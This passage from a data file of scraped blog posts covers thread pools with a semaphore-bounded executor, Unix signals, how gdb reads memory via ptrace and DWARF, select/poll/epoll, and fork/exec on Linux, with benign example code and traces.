awesome than I am today. Which is pretty awesome =D \n\n Abstractions \n\n I think the thread pool abstractions I’m working with in Scala are not the best abstractions. Not because they don’t make it easier to program with concurrency – they do! \n\n But the best abstractions I work with (the TCP/IP network layer! unix pipes!) let me use them for years without understanding in the slightest how they worked. When working with these concurrency abstractions I end up having to worry almost immediately about what’s underneath because the underlying queue has filled up and crashed my program. \n\n I  love  learning about what’s underneath abstractions, but it is kinda time consuming. I guess it’s hard to build abstractions over thread pools! Maybe you really just have to understand how they’re implemented to work with them effectively. Either way – now I know more, and I can work with them a little better. \n\n"},
{"url": "https://jvns.ca/blog/2016/03/29/thread-pools-part-ii-i-love-blocking/", "title": "I conquered thread pools! For today, at least.", "content": "\n     \n\n The other day I wrote  Thread pools! How do I use them?  chronicling my Extreme Confusion about how to parallelize a task in Java/Scala. I am less confused now! Let me tell you how. \n\n To recap: I wanted to \n\n \n send a bunch of work to some worker threads, in parallel \n have them do the work without anything exploding \n that’s it \n \n\n This turned out to be surprisingly difficult. A lot of people gave me a lot of suggestions about how to accomplish this. Here’s what I did! \n\n pipes = the best \n\n I thought a bit about how Unix pipes are one of my favorite abstractions. You pipe stuff from  thing1  to  thing2  ( thing1 | thing2 ), it works, nothing explodes. Why? \n\n Well, pipes have an internal buffer, and when the buffer is full,  thing1  is not allowed to write to the pipe any more. It blocks. Several people pointed out to me that Go channels also work exactly this way. Super nice! \n\n I think I want my concurrency to work like pipes (with an internal buffer that blocks). But how? \n\n blocking submissions to a thread pool in Java: nope \n\n So, is there something in Java’s standard library that lets you submit to a thread pool and block if the thread pool is too busy? Spoiler: no, there is not. \n\n I looked at the docs, I read Stack Overflow, and I watched jessitron’s fantastic  Concurrency Options on the JVM  talk (which is GREAT and you should watch it). No dice. \n\n There is  CallerRunsPolicy  which will make the calling thread run the task if the thread pool is too busy, but that was not what I wanted. \n\n java concurrency in practice saves the day \n\n Okay, so Java 7’s standard library hates me. Fine. Well, Java is Turing-complete and, besides, has all kinds of concurrency primitives. This is definitely possible to do in a nice way. But how?! I asked Kamal what he thought and he was like “wow, it’s weird that it’s not in the standard library!”. \n\n We googled and Kamal found this gorgeous code snippet from the book  Java Concurrency in Practice  –  BoundedExecutor.java . Here it is: \n\n public class BoundedExecutor {\n    private final Executor exec;\n    private final Semaphore semaphore;\n\n    public BoundedExecutor(Executor exec, int bound) {\n        this.exec = exec;\n        this.semaphore = new Semaphore(bound);\n    }\n\n    public void submitTask(final Runnable command)\n            throws InterruptedException {\n        semaphore.acquire();\n        try {\n            exec.execute(new Runnable() {\n                public void run() {\n                    try {\n                        command.run();\n                    } finally {\n                        semaphore.release();\n                    }\n                }\n            });\n        } catch (RejectedExecutionException e) {\n            semaphore.release();\n        }\n    }\n}\n \n\n I didn’t know what a semaphore was until I read this code and I was like OH THIS IS AMAZING AND SO USEFUL AND WOW. A semaphore is just a shared int that you can decrement and increment!  acquire()  decrements,  release()  increments. And if it gets to 0,  semaphore.acquire()  will block until someone else has released it. Awesome. That  is  a great concurrency primitive! \n\n I implemented a version of this in my code and everything worked amazingly. It all parallelized super beautifully, my main thread just delegated work, and my worker threads were all busy all the time. \n\n I tweeted about how great Java Concurrency in Practice is and everyone was like “yeah that book was so formative for me it made me love concurrency” “seriously it’s such a great book” “it’s like K&R”. So now I’m way way way more motivated to read it. \n\n how to shutdown a thread pool \n\n Here’s what I did: \n\n service.shutdown()\nservice.awaitTermination(Long.MaxLong, TimeUnit.Seconds)\n \n\n This tells it to stop accepting new tasks, and then wait for all the tasks to finish! This is easy but I needed to remember to do it and think through it. \n\n a super quick note on Python \n\n Out of curiosity, I looked at Python’s thread pool ( ThreadPoolExecutor  from  futures  in Python 2). It doesn’t even let you configure the internal submission queue on your thread pool! Luckily the implementation of ThreadPoolExecutor is  not very long  so we can always write our own or something if we are dissatisfied and brave. \n\n Final scores \n\n \n java standard library: 0.5 (for having the primitives I wanted) \n twitter’s FuturePool: 0 (nope.) \n Python: ???, but, not relevant \n scala streams / other parallel collections: 0 \n Java Concurrency in Practice: 1 \n julia & kamal: 1 \n \n\n WE WIN. \n\n"},
{"url": "https://jvns.ca/blog/2016/06/13/should-you-be-scared-of-signals/", "title": "Should you be scared of Unix signals?", "content": "\n     \n\n Yesterday I said I was scared of Unix signals, and some experienced people who I respect said “no, you should not be! unix signals are a very well known thing!”. I was sort of surprised because I think of signals as being a little scary! Here are some facts I have collected to try to think through this. \n\n what’s a unix signal? \n\n Signals are a way for Unix processes to communicate! Except for SIGKILL. When you get sent SIGKILL nobody communicates with you, you just die immediately. \n\n But the rest of the signals you’re allowed to install signal handlers for. So! Let’s say you want to handle SIGALRM with  my_awesome_function \n\n You tell the Linux kernel  signal(SIGALRM, my_awesome_function) . It remembers. When you get sent SIGALRM: \n\n \n the linux kernel is like “hey, a signal!” \n It stops your process. \n It saves all the registers in your process, and runs  my_awesome_function \n once  my_awesome_function  is done, it puts everything back and sends you on your way. \n \n\n on its face, this seems fine. the kernel will put your program back on its feet when it’s done with the signal! no problem! \n\n what can go wrong if you use signals? \n\n here are a few things. I think I am missing some. \n\n \n you need to be careful and make sure that other signals do not arrive while you are handling a signal \n if you’re doing a  read  or  write  system call, and there’s a signal, your read might be interrupted! You will get a return value  EINTR . This is generally a normal thing that can happen but this weekend I saw a Rust program crash because it did not know how to handle EINTR. \n surprise! now you have a concurrent program! you need to be very careful if you modify anything in your signal handler code because WHO KNOWS what state that thing was in before you changed it. \n \n\n This paragraph from  this article  explains really wonderfully what is difficult about signal handlers: \n\n \n If you register a signal handler, it’s called in the middle of whatever code\nyou happen to be running. This sets up some very onerous restrictions on what\na signal handler can do: it can’t assume that any locks are unlocked, any\ncomplex data structures are in a reliable state, etc. The restrictions are\nstronger than the restrictions on thread-safe code, since the signal handler\ninterrupts and stops the original code from running. So, for instance, it\ncan’t even wait on a lock, because the code that’s holding the lock is paused\nuntil the signal handler completes. This means that a lot of convenient\nfunctions, including the stdio functions, malloc, etc., are unusable from a\nsignal handler, because they take locks internally. \n \n\n Jesse Luehrs pointed out to be that  man 7 signal  has a list of functions that it’s safe to call from signal handlers. (it is perhaps telling that functions are by default unsafe to call from signal handlers :) ) \n\n what important programs use signals? \n\n I wanted to feel better about using signals, so I asked on Twitter what important programs that I trust use signals really extensively. \n\n First,  init . That’s PID 1 on older Linux systems! It turns out when I press ctrl+alt+delete on my computer, that sends a SIGINT to the init process, which then restarts the machine. I didn’t know that! Cool! Init also responds to a few other signals in various ways. \n\n Next, my  terminal . You know when you resize your terminal and it reflows all the text? That’s it receiving a whole bunch of SIGWINCH (window change) signals, and updating its size and then redrawing everything accordingly. This one made me feel better because a terminal is a Complicated Program, but it is totally handling lots of signals okay all the time! \n\n When a child process of yours exits, you get a SIGCHLD signal. I think this is how my shell knows to report to me that a process has exited. \n\n @geofft  also said that “ the JVM  uses signal handlers to implement cross-thread stop-the-world GC” \n\n A lot of programs (like  unicorn ) handle signals like SIGHUP to  gracefully restart . Apparently it uses  SIGTTIN  and  SIGTTOU  to increment and decrement the number of worker processes? Apparently  TTIN  stands for “teletype input”. POSIX is weird! We will never escape teletypes? \n\n SIGSEGV  is a very important signal. It happens when your program tries to access memory that it does not have. A normal reaction to this signal is to die. But you can also do weird stuff! The  libsigsegv library  gives a few examples of what you can use it to do: \n\n \n allocate more memory \n read some data from disk into that memory \n do something with garbage collection (but what? I’m confused about this still.) \n \n\n my friend dave pointed me to  this code in an emulator that uses SEGV to notice when a video buffer is updated . \n\n Another really common reason to catch SIGSEGV is to not actually recover (doing this properly is tricky!), but to catch crashes to provide a better error message or get a backtrace. Here’s  example code  and  the debug output it produces . Thanks to  Jesse  for this example! \n\n Phew. Okay, I think we believe that signals are important now. \n\n hundreds of signals per second \n\n The whole reason I started thinking about signals in the first place is – I looked at the source code for  stackprof , a Ruby profiling tool. Basically what it does is it uses the  setitimer  Linux system call to say “Hi! Please send me a signal every 2 milliseconds!” and then it records a stack trace every time it gets a signal. \n\n I thought this was cool because the C code for this program is actually pretty easy to read. \n\n But! Getting hundreds of signals a second is really quite different from just one signal every now and then. This makes me feel worried because your program is being constantly interrupted all the time. This has some overhead, and maybe it causes problems with IO because your reads get interrupted all the time? \n\n signalfd \n\n Are you scared of your program being arbitrarily interrupted at any point? In Linux, there is a thing called  signalfd  for you!.Here’s what the man page says: \n\n \n signalfd()  creates  a  file descriptor that can be used to accept\nsignals targeted at the caller.  This provides an alternative to the use\nof a signal handler or sigwaitinfo(2), and has the advantage that the\nfile  descriptor  may  be  monitored  by  select(2), poll(2), and\nepoll(7). \n \n\n I’ve still never used this but I find the idea appealing! The idea is that you can have a thread that is constantly waiting for signals to handle. \n\n I like this because it means you have a concurrent program (the thread is waiting for a signal), but it’s much more explicit that you’re running a concurrent program instead of having a weird signal handler that exists outside of space and time. \n\n However apparently there are problems with signalfd and it is not a land of rainbow goodness. When I googled it I came across an article by the aforementioned @geofft called  signalfd is useless  which talks about some annoying / nonobvious things about using it. The  hacker news discussion on that article  is also mostly civil & interesting. \n\n signals are not trivial, but it looks like they’re possible! \n\n So after seeing how all these important programs use signals, I think I believe it’s possible to use signals for Very Important Things and still stay safe, as long as you’re careful. I still don’t feel like I know the complete list of things you need to be careful of when using signals though. If you know a good List Of What Can Go Wrong With Signals I would like to know about it! \n\n I’m also still not sure if it’s a reasonable idea to receive hundreds of signals a second. Though stackprof does mostly work, so I guess it can’t be that unreasonable! \n\n don’t be afraid! be careful! \n\n I find topics like this interesting because – I don’t like having Fears and Uncertainties about things that I can’t base in fact. Like – it’s unreasonable to say “threads are hard! never use threads! it is scary”. Threads are important! Sometimes you need to use them! It is possible to write correct threaded programs! Instead it is better to say “this code is not thread safe because of SPECIFIC REASON! it will not work!”. \n\n I feel like getting one bajillion replies on twitter helped a bit with creating facts out of my fears about signals :) \n\n"},
{"url": "https://jvns.ca/blog/2016/08/10/how-does-gdb-work/", "title": "How does gdb work?", "content": "\n     \n\n Hello! Today I was working a bit on my  ruby stacktrace project  and I realized that now I know a couple of things about how gdb works internally. \n\n Lately I’ve been using gdb to look at Ruby programs, so we’re going to be running gdb on a Ruby program. This really means the Ruby interpreter. First, we’re going to print out the address of a global variable:  ruby_current_thread : \n\n getting a global variable \n\n Here’s how to get the address of the global  ruby_current_thread : \n\n $ sudo gdb -p 2983\n(gdb) p & ruby_current_thread\n$2 = (rb_thread_t **) 0x5598a9a8f7f0 <ruby_current_thread>\n \n\n There are a few places a variable can live: on the heap, the stack, or in your program’s text. Global variables are part of your program! You can think of them as being allocated at compile time, kind of. It turns out we can figure out the address of a global variable pretty easily! Let’s see how  gdb  came up with  0x5598a9a8f7f0 . \n\n We can find the approximate region this variable lives in by looking at a cool file in  /proc  called  /proc/$pid/maps . \n\n $ sudo cat /proc/2983/maps | grep bin/ruby\n5598a9605000-5598a9886000 r-xp 00000000 00:32 323508                     /home/bork/.rbenv/versions/2.1.6/bin/ruby\n5598a9a86000-5598a9a8b000 r--p 00281000 00:32 323508                     /home/bork/.rbenv/versions/2.1.6/bin/ruby\n5598a9a8b000-5598a9a8d000 rw-p 00286000 00:32 323508                     /home/bork/.rbenv/versions/2.1.6/bin/ruby\n \n\n So! There’s this starting address  5598a9605000  That’s  like   0x5598a9a8f7f0 , but different. How different? Well, here’s what I get when I subtract them: \n\n (gdb) p/x 0x5598a9a8f7f0 - 0x5598a9605000\n$4 = 0x48a7f0\n \n\n “What’s that number?”, you might ask? WELL. Let’s look at the  symbol table  for our program with  nm . \n\n sudo nm /proc/2983/exe | grep ruby_current_thread\n000000000048a7f0 b ruby_current_thread\n \n\n What’s that we see? Could it be  0x48a7f0 ? Yes it is! So!! If we want to find the address of a global variable in our program, all we need to do is look up the name of the variable in the symbol table, and then add that to the start of the range in  /proc/whatever/maps , and we’re done! \n\n So now we know how gdb does that. But gdb does so much more!! Let’s skip ahead to… \n\n dereferencing pointers \n\n (gdb) p ruby_current_thread\n$1 = (rb_thread_t *) 0x5598ab3235b0\n \n\n The next thing we’re going to do is  dereference  that  ruby_current_thread  pointer. We want to see what’s in that address! To do that, gdb will run a bunch of system calls like this: \n\n ptrace(PTRACE_PEEKTEXT, 2983, 0x5598a9a8f7f0, [0x5598ab3235b0]) = 0\n \n\n You remember this address  0x5598a9a8f7f0 ? gdb is asking “hey, what’s in that address exactly”?  2983  is the PID of the process we’re running gdb on. It’s using the  ptrace  system call which is how gdb does everything. \n\n Awesome! So we can dereference memory and figure out what bytes are at what memory addresses. Some useful gdb commands to know here are  x/40w variable  and  x/40b variable  which will display 40 words / bytes at a given address, respectively. \n\n describing structs \n\n The memory at an address looks like this. A bunch of bytes! \n\n (gdb) x/40b ruby_current_thread\n0x5598ab3235b0:\t16\t-90\t55\t-85\t-104\t85\t0\t0\n0x5598ab3235b8:\t32\t47\t50\t-85\t-104\t85\t0\t0\n0x5598ab3235c0:\t16\t-64\t-55\t115\t-97\t127\t0\t0\n0x5598ab3235c8:\t0\t0\t2\t0\t0\t0\t0\t0\n0x5598ab3235d0:\t-96\t-83\t-39\t115\t-97\t127\t0\t0\n \n\n That’s useful, but not that useful! If you are a human like me and want to know what it MEANS, you need more. Like this: \n\n (gdb) p *(ruby_current_thread)\n$8 = {self = 94114195940880, vm = 0x5598ab322f20, stack = 0x7f9f73c9c010,\n\tstack_size = 131072, cfp = 0x7f9f73d9ada0, safe_level = 0,    raised_flag = 0,\n\tlast_status = 8, state = 0, waiting_fd = -1, passed_block = 0x0,\n\tpassed_bmethod_me = 0x0, passed_ci = 0x0,    top_self = 94114195612680,\n\ttop_wrapper = 0, base_block = 0x0, root_lep = 0x0, root_svar = 8, thread_id =\n\t140322820187904,\n \n\n GOODNESS. That is a lot more useful. How does gdb know that there are all these cool fields like  stack_size ? Enter DWARF. DWARF is a way to store extra debugging data about your program, so that debuggers like gdb can do their job better! It’s generally stored as part of a binary. If I run  dwarfdump  on my Ruby binary, I get some output like this: \n\n (I’ve redacted it heavily to make it easier to understand) \n\n DW_AT_name                  \"rb_thread_struct\"\nDW_AT_byte_size             0x000003e8\nDW_TAG_member\n  DW_AT_name                  \"self\"\n  DW_AT_type                  <0x00000579>\n  DW_AT_data_member_location  DW_OP_plus_uconst 0\nDW_TAG_member\n  DW_AT_name                  \"vm\"\n  DW_AT_type                  <0x0000270c>\n  DW_AT_data_member_location  DW_OP_plus_uconst 8\nDW_TAG_member\n  DW_AT_name                  \"stack\"\n  DW_AT_type                  <0x000006b3>\n  DW_AT_data_member_location  DW_OP_plus_uconst 16\nDW_TAG_member\n  DW_AT_name                  \"stack_size\"\n  DW_AT_type                  <0x00000031>\n  DW_AT_data_member_location  DW_OP_plus_uconst 24\nDW_TAG_member\n  DW_AT_name                  \"cfp\"\n  DW_AT_type                  <0x00002712>\n  DW_AT_data_member_location  DW_OP_plus_uconst 32\nDW_TAG_member\n  DW_AT_name                  \"safe_level\"\n  DW_AT_type                  <0x00000066>\n \n\n So. The name of the type of  ruby_current_thread  is  rb_thread_struct . It has size  0x3e8  (or 1000 bytes), and it has a bunch of member items.  stack_size  is one of them, at an offset of 24, and it has type 31. What’s 31? No worries! We can look that up in the DWARF info too! \n\n < 1><0x00000031>    DW_TAG_typedef\n                      DW_AT_name                  \"size_t\"\n                      DW_AT_type                  <0x0000003c>\n< 1><0x0000003c>    DW_TAG_base_type\n                      DW_AT_byte_size             0x00000008\n                      DW_AT_encoding              DW_ATE_unsigned\n                      DW_AT_name                  \"long unsigned int\"\n\n \n\n So!  stack_size  has type  size_t , which means  long unsigned int , and is 8 bytes. That means that we can read the stack size! \n\n How that would break down, once we have the DWARF debugging data, is: \n\n \n Read the region of memory that  ruby_current_thread  is pointing to \n Add 24 bytes to get to  stack_size \n Read 8 bytes (in little-endian format, since we’re on x86) \n Get the answer! \n \n\n Which in this case is 131072 or 128 kb. \n\n To me, this makes it a lot more obvious what debugging info is  for  – if we didn’t have all this extra metadata about what all these variables meant, we would have no idea what the bytes at address  0x5598ab3235b0  meant. \n\n This is also why you can install debug info for a program separately from your program – gdb doesn’t care where it gets the extra debug info from. \n\n DWARF is confusing \n\n I’ve been reading a bunch of DWARF info recently. Right now I’m using libdwarf which hasn’t been the best experience – the API is confusing, you initialize everything in a weird way, and it’s really slow (it takes 0.3 seconds to read all the debugging data out of my Ruby program which seems ridiculous). I’ve been told that libdw from elfutils is better. \n\n Also, I casually remarked that you can look at  DW_AT_data_member_location  to get the offset of a struct member! But I looked up on Stack Overflow how to actually do that and I got  this answer . Basically you start with a check like: \n\n dwarf_whatform(attrs[i], &form, &error);\n    if (form == DW_FORM_data1 || form == DW_FORM_data2\n        form == DW_FORM_data2 || form == DW_FORM_data4\n        form == DW_FORM_data8 || form == DW_FORM_udata) {\n \n\n and then it keeps GOING. Why are there 8 million different  DW_FORM_data  things I need to check for? What is happening? I have no idea. \n\n Anyway my impression is that DWARF is a large and complicated standard (and possibly the libraries people use to generate DWARF are subtly incompatible?), but it’s what we have, so that’s what we work with! \n\n I think it’s really cool that I can write code that reads DWARF and my code actually mostly works. Except when it crashes. I’m working on that. \n\n unwinding stacktraces \n\n In an earlier version of this post, I said that gdb unwinds stacktraces using\nlibunwind. It turns out that this isn’t true at all! \n\n Someone who’s worked on gdb a lot emailed me to say that they actually spent a\nton of time figuring out how to unwind stacktraces so that they can do a\nbetter job than libunwind does. This means that if you get stopped in the\nmiddle of a weird program with less debug info than you might hope for that’s\ndone something strange with its stack, gdb will try to figure out where you\nare anyway. Thanks <3 \n\n other things gdb does \n\n The few things I’ve described here (reading memory, understanding DWARF to show you structs) aren’t everything gdb does – just looking through Brendan Gregg’s  gdb example from yesterday , we see that gdb also knows how to \n\n \n disassemble assembly \n show you the contents of your registers \n \n\n and in terms of manipulating your program, it can \n\n \n set breakpoints and step through a program \n modify memory (!! danger !!) \n \n\n Knowing more about how gdb works makes me feel a lot more confident when using\nit! I used to get really confused because gdb kind of acts like a C REPL\nsometimes – you type  ruby_current_thread->cfp->iseq , and it feels like\nwriting C code! But you’re not really writing C at all, and it was easy for\nme to run into limitations in gdb and not understand why. \n\n Knowing that it’s using DWARF to figure out the contents of the structs gives me a better mental model and have more correct expectations! Awesome. \n\n"},
{"url": "https://jvns.ca/blog/2017/06/03/async-io-on-linux--select--poll--and-epoll/", "title": "Async IO on Linux: select, poll, and epoll", "content": "\n     \n\n This week I got a new book in the mail:  The Linux Programming Interface . My awesome coworker Arshia recommended it to me so I bought it! It’s written by the\nmaintainer of the  Linux man-pages project , Michael Kerrisk. It talks about the Linux programming interface as of kernel 2.6.x. \n\n Here’s the cover. \n\n \n \n \n\n In the contributing guidelines (you can contribute to the linux man pages!! mind=blown), there’s a list of  missing man pages  that would be useful to contribute. It says: \n\n \n You need to have a reasonably high degree of understanding of the\ntopic, or be prepared to invest the time (e.g., reading source code,\nwriting test programs) to gain that understanding. Writing test\nprograms is important: quite a few kernel and glibc bugs have been\nuncovered while writing test programs during the preparation of man\npages. \n \n\n I thought this was a cool reminder of how you can learn a lot by\ndocumenting something & writing small test programs! \n\n But today we’re going to talk about something I learned from this book:\nthe  select ,  poll , and  epoll  system calls. \n\n Chapter 63: Alternative I/O models \n\n This book is huge: 1400 pages. I started it at Chapter 63 (“alternative\nI/O models”) because I’ve been meaning to understand better what’s up with\n select ,  poll  and  epoll  for quite some time. And writing up things\nI learn helps me understand them, so here’s my attempt at explaining! \n\n This chapter is basically about how to monitor a lot of file descriptors\nfor new input/output. Who needs to watch a lot of file descriptors at a\ntime? Servers! \n\n For example if you’re writing a web server in node.js on Linux, it’s\nactually using the  epoll  Linux system call under the hood. Let’s talk\nabout why, how  epoll  is different from  poll  and  select , and about how it works! \n\n Servers need to watch a lot of file descriptors \n\n Suppose you’re a webserver. Every\ntime you accept a connection with the  accept  system call ( here’s the man page ),\nyou get a new file descriptor representing that connection. \n\n If you’re a web server, you might have thousands of connections open at\nthe same time. You need to know when people send you new data on those\nconnections, so you can process and respond to them. \n\n You could have a loop that basically does: \n\n for x in open_connections:\n    if has_new_input(x):\n        process_input(x)\n \n\n The problem with this is that it can waste a lot of CPU time. Instead of\nspending all CPU time to ask “are there updates now? how about now? how\nabout now? how about now?“, instead we’d rather just ask the Linux kernel\n“hey, here are 100 file descriptors. Tell me when one of them is\nupdated!“. \n\n The 3 system calls that let you ask Linux to monitor lots of file\ndescriptors are  poll ,  epoll  and  select . Let’s start with poll and\nselect because that’s where the chapter started. \n\n First way: select & poll \n\n These 2 system calls are available on any Unix system, while  epoll  is\nLinux-specific. Here’s basically how they work: \n\n \n Give them a list of file descriptors to get information about \n They tell you which ones have data available to read/write to \n \n\n The first surprising thing I learned from this chapter are that  poll\nand select fundamentally use the same code . \n\n I went to look at the definition of  poll  and  select  in the Linux kernel\nsource to confirm this and it’s true! \n\n \n here’s the  definition of the select syscall  and  do_select \n and the  definition of the poll syscall  and  do_poll \n \n\n They both call a lot of the same functions. One thing that the book\nmentioned in particular is that  poll  returns a larger set of possible\nresults for file descriptors like  POLLRDNORM | POLLRDBAND | POLLIN | POLLHUP | POLLERR  while  select  just tells you “there’s input / there’s output / there’s an error”. \n\n select  translates from  poll ’s more detailed results (like  POLLWRBAND ) into a general “you can write”. You can see the code where it does this in Linux 4.10  here . \n\n The next thing I learned is that  poll can perform better than select if you have a sparse set of file descriptors  . \n\n To see this, you can actually just look at the signatures for poll and\nselect! \n\n int ppoll(struct pollfd *fds, nfds_t nfds,\n          const struct timespec *tmo_p, const sigset_t\n          *sigmask)`\nint pselect(int nfds, fd_set *readfds, fd_set *writefds,\n            fd_set *exceptfds, const struct timespec *timeout,\n            const sigset_t *sigmask);\n \n\n With  poll , you tell it “here are the file descriptors I want to monitor: 1,\n3, 8, 19, etc” (that’s the  pollfd  argument. With select, you tell it “I want to monitor 19 file\ndescriptors. Here are 3 bitsets with which ones to monitor for reads / writes / exceptions.”\nSo when it runs, it  loops from 0 to 19 file descriptors ,\neven if you were actually only interested in 4 of them. \n\n There are a lot more specific details about how  poll  and  select  are\ndifferent in the chapter but those were the 2 main things I learned! \n\n why don’t we use poll and select? \n\n Okay, but on Linux we said that your node.js server won’t use either poll or\nselect, it’s going to use  epoll . Why? \n\n From the book: \n\n \n On each call to  select()  or  poll() , the kernel must check all of the\nspecified file descriptors to see if they are ready. When monitoring a large\nnumber of file descriptors that are in a densely packed range, the timed\nrequired for this operation greatly outweighs [the rest of the stuff they have\nto do] \n \n\n Basically: every time you call  select  or  poll , the kernel needs to\ncheck from scratch whether your file descriptors are available for\nwriting. The kernel doesn’t remember the list of file descriptors it’s\nsupposed to be monitoring! \n\n Signal-driven I/O (is this a thing people use?) \n\n The book actually describes 2 ways to ask the kernel to remember the\nlist of file descriptors it’s supposed to be monitoring: signal-drive\nI/O and  epoll . Signal-driven I/O is a way to get the kernel to send\nyou a signal when a file descriptor is updated by calling  fcntl . I’ve\nnever heard of anyone using this and the book makes it sound like\n epoll  is just better so we’re going to ignore it for now and talk about epoll. \n\n level-triggered vs edge-triggered \n\n Before we talk about epoll, we need to talk about “level-triggered” vs\n“edge-triggered” notifications about file descriptors. I’d never heard\nthis terminology before (I think it comes from electrical engineering\nmaybe?). Basically there are 2 ways to get notifications \n\n \n get a list of every file descriptor you’re interested in that is readable (“level-triggered”) \n get notifications every time a file descriptor becomes readable\n(“edge-triggered”) \n \n\n what’s epoll? \n\n Okay, we’re ready to talk about epoll!! This is very exciting to because\nI’ve seen  epoll_wait  a lot when stracing programs and I often feel\nkind of fuzzy about what it means exactly. \n\n The  epoll  group of system calls ( epoll_create ,  epoll_ctl ,\n epoll_wait ) give the Linux kernel a list of file descriptors to track\nand ask for updates about activity on those file descriptors. \n\n Here are the steps to using epoll: \n\n \n Call  epoll_create  to tell the kernel you’re gong to be epolling! It\ngives you an id back \n Call  epoll_ctl  to tell the kernel file descriptors you’re\ninterested in updates about. Interestingly, you can give it lots of\ndifferent kinds of file descriptors (pipes,\nFIFOs, sockets, POSIX message queues, inotify instances, devices, & more), but\n not regular files . I think this makes sense – pipes & sockets\nhave a pretty simple API (one process writes to the pipe, and another\nprocess reads!), so it makes sense to say “this pipe has new data for\nreading”. But files are weird! You can write to the middle of a file!\nSo it doesn’t really make sense to say “there’s new data available\nfor reading in this file”. \n Call  epoll_wait  to wait for updates about the list of files\nyou’re interested in. \n \n\n performance: select & poll vs epoll \n\n In the book there’s a table comparing the performance for 100,000\nmonitoring operations: \n\n # operations  |  poll  |  select   | epoll\n10            |   0.61 |    0.73   | 0.41\n100           |   2.9  |    3.0    | 0.42\n1000          |  35    |   35      | 0.53\n10000         | 990    |  930      | 0.66\n \n\n So using epoll really is a lot faster once you have more than 10 or so\nfile descriptors to monitor. \n\n who uses epoll? \n\n I sometimes see  epoll_wait  when I strace a program. Why? There is the\nkind of obvious but unhelpful answer “it’s monitoring some file\ndescriptors”, but we can do better! \n\n First – if you’re using green threads or an event loop, you’re likely\nusing epoll to do all your networking & pipe I/O! \n\n For example, here’s a golang program that uses epoll on Linux! \n\n package main\n\nimport \"net/http\"\nimport \"io/ioutil\"\n\nfunc main() {\n    resp, err := http.Get(\"http://example.com/\")\n        if err != nil {\n            // handle error\n        }\n    defer resp.Body.Close()\n    _, err = ioutil.ReadAll(resp.Body)\n}\n \n\n Here you can see the golang run time using epoll to do a DNS lookup: \n\n 16016 connect(3, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr(\"127.0.1.1\")}, 16 <unfinished ...>\n16020 socket(PF_INET, SOCK_DGRAM|SOCK_CLOEXEC|SOCK_NONBLOCK, IPPROTO_IP\n16016 epoll_create1(EPOLL_CLOEXEC <unfinished ...>\n16016 epoll_ctl(5, EPOLL_CTL_ADD, 3, {EPOLLIN|EPOLLOUT|EPOLLRDHUP|EPOLLET, {u32=334042824, u64=139818699396808}}\n16020 connect(4, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr(\"127.0.1.1\")}, 16 <unfinished ...>\n16020 epoll_ctl(5, EPOLL_CTL_ADD, 4, {EPOLLIN|EPOLLOUT|EPOLLRDHUP|EPOLLET, {u32=334042632, u64=139818699396616}}\n \n\n Basically what this is doing is connecting 2 sockets (on file\ndescriptors 3 and 4) to make DNS queries (to 127.0.1.1:53), and then\nusing  epoll_ctl  to ask epoll to give us updates about them \n\n Then it makes 2 DNS queries for example.com (why 2? nelhage suggests one\nof them is querying for the A record, and one for the AAAA record!), and\nuses  epoll_wait  to wait for replies \n\n # these are DNS queries for example.com!\n16016 write(3, \"\\3048\\1\\0\\0\\1\\0\\0\\0\\0\\0\\0\\7example\\3com\\0\\0\\34\\0\\1\", 29\n16020 write(4, \";\\251\\1\\0\\0\\1\\0\\0\\0\\0\\0\\0\\7example\\3com\\0\\0\\1\\0\\1\", 29\n# here it tries to read a response but I guess there's no response\n# available yet\n16016 read(3,  <unfinished ...>\n16020 read(4,  <unfinished ...>\n16016 <... read resumed> 0xc8200f4000, 512) = -1 EAGAIN (Resource temporarily unavailable)\n16020 <... read resumed> 0xc8200f6000, 512) = -1 EAGAIN (Resource temporarily unavailable)\n# then it uses epoll to wait for responses\n16016 epoll_wait(5,  <unfinished ...>\n16020 epoll_wait(5,  <unfinished ...>\n \n\n So one reason your program might be using epoll “it’s in Go / node.js /\nPython with gevent and it’s doing networking”. \n\n What libraries do go/node.js/Python use to use epoll? \n\n \n node.js uses  libuv  (which was\nwritten for the node.js project) \n the gevent networking library in Python uses  libev/libevent \n golang uses some custom code, because it’s Go. This  looks like it might be the implementation of network polling with epoll in the golang runtime  – it’s only about 100 lines which is interesting. You can see the general netpoll interface  here  – it’s implemented on BSDs with kqueue instead \n \n\n Webservers also implement epoll – for example  here’s the epoll code in nginx . \n\n more select & epoll reading \n\n I liked these 3 posts by Marek: \n\n \n select is fundamentally broken \n epoll is fundamentally broken part 1 \n epoll is fundamentally broken part 2 \n \n\n In particular these talk about how epoll’s support for multithreaded\nprograms has not historically been good, though there were some\nimprovements in Linux 4.5. \n\n and this: \n\n \n using select (2) the right way \n \n\n ok that’s enough \n\n I learned quite a few new things about select & epoll by writing this\npost! We’re at 1800 words now so I think that’s enough. Looking forward\nto reading more of this Linux programming interface book and finding out\nmore things! \n\n Probably there are some wrong things in this post, let me know what they\nare! \n\n One small thing I like about my job is that I can expense programming\nbooks! This is cool because sometimes it causes me to buy and read books\nthat teach me things that I might not have learned otherwise. And buying\na book is way cheaper than going to a conference! \n\n"},
{"url": "https://jvns.ca/blog/2016/10/04/exec-will-eat-your-brain/", "title": "What happens when you start a process on Linux?", "content": "\n     \n\n This is about how fork and exec works on Unix. You might already know about this, but some\npeople don’t, and I was surprised when I learned it a few years back! \n\n So. You want to start a process. We’ve talked a lot about  system calls  on this blog – every time you start a process, or open a file, that’s a system call. So you might think that there’s a system call like this \n\n start_process([\"ls\", \"-l\", \"my_cool_directory\"])\n \n\n This is a reasonable thing to think and apparently it’s how it works in DOS/Windows. I was\ngoing to say that this  isn’t  how it works on Linux. But! I went and looked at the docs and apparently there is a  posix_spawn  system call that does basically this. Shows what I know. Anyway, we’re not going to talk about that. \n\n fork and exec \n\n posix_spawn  on Linux is behind the scenes implemented in terms of 2 system calls called\n fork  and  exec  (actually  execve ), which are what people usually actually use anyway. On OS X apparently people use  posix_spawn  and fork/exec are discouraged! But we’ll talk about Linux. \n\n Every process in Linux lives in a “process tree”. You can see that tree by running\n pstree . The root of the tree is  init , with PID 1. Every process (except init) has a parent, and any process has many children. \n\n So, let’s say I want to start a process called  ls  to list a directory. Do I just have a\nbaby  ls ? No! \n\n Instead of having children, what I do is you have a child that is a clone of myself, and then that child gets its brain eaten and turns into  ls . Really. \n\n We start out like this: \n\n my parent\n    |- me\n \n\n Then I run  fork() . I have a child which is a clone of myself. \n\n my parent\n    |- me\n       |-- clone of me\n \n\n Then I 